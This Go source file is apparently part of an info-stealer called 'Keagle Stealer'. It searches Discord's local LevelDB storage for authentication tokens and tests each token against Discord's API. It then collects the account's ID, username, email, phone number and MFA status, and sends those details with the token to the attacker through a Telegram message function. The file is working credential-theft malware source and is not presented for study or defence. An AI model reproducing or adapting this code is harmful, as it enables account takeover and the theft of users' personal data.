package scripts

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func GetDiscordTokens() (tokens []string) {

	var (
		newTokens   []string
		countTokens string
	)

	path := GetDiscordPath()

	for _, p := range path {

		path := p + "\\Local Storage\\leveldb\\"

		if _, err := os.Stat(path); os.IsNotExist(err) {

			continue
		}

		files, err := os.ReadDir(path)

		if err != nil {

			continue

		}

		for _, file := range files {

			name := file.Name()

			if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {

				content, err := os.ReadFile(fmt.Sprint(path, "/", name))

				if err != nil {
					continue
				}

				if strings.Contains(path, "cord") {

					GetEncryptedToken(content, fmt.Sprint(p, "//Local State"), &tokens)

				} else {

					GetDecryptedToken(content, &tokens)

				}
			}
		}
	}

	for _, token := range tokens {

		countTokens += fmt.Sprintf(token)
		count := strings.Count(countTokens, token)

		if count > 1 {

			continue

		} else {

			checkToken := CheckDiscordToken(token)

			if checkToken == true {

				newTokens = append(newTokens, token)

			} else {

				continue

			}
		}

	}

	return newTokens

}

func CheckDiscordToken(token string) bool {

	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)

	req.Header.Add("Authorization", token)
	req.Header.Add("Content-Type", "application/json")

	res, _ := http.DefaultClient.Do(req)

	if res.StatusCode == 200 {
		return true
	} else {
		return false
	}

}

func GetDiscordInformation(token string) {

	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)

	req.Header.Add("Authorization", token)
	req.Header.Add("Content-Type", "application/json")

	res, _ := http.DefaultClient.Do(req)

	body, _ := ioutil.ReadAll(res.Body)

	var data map[string]string

	json.Unmarshal(body, &data)

	discordId := data["id"]
	discordUsername := data["username"]
	discordName := data["global_name"]
	discordMfa := data["mfa_enabled"]
	discordLocal := data["local"]
	discordEmail := data["email"]
	discordPhone := data["phone"]

	if discordMfa == "" {

		discordMfa = "None"

	}

	if discordLocal == "" {

		discordLocal = "None"

	}

	if discordPhone == "" {

		discordPhone = "None"

	}

	message := fmt.Sprintf(
		"<b><u>🦅 Keagle Stealer</u> - Discord Informations</b>\n\n"+
			"🔑<b> Discord Token:</b> <code>%s</code>\n"+
			"🆔<b> Discord ID:</b> <code>%s</code>\n"+
			"👤<b> Username:</b> <code>%s</code>\n"+
			"👥<b> Global Name:</b> <code>%s</code>\n"+
			"🔑<b> MFA:</b> <code>%s</code>\n"+
			"🌏<b> Country:</b> <code>%s</code>\n"+
			"✉<b> Email:</b> <code>%s</code>\n"+
			"📞<b> Phone:</b> <code>%s</code>\n",
		token, discordId, discordUsername, discordName, discordMfa, discordLocal, discordEmail, discordPhone)

	r := SendTelegramMessage(message)

	if r == true {
	}

}
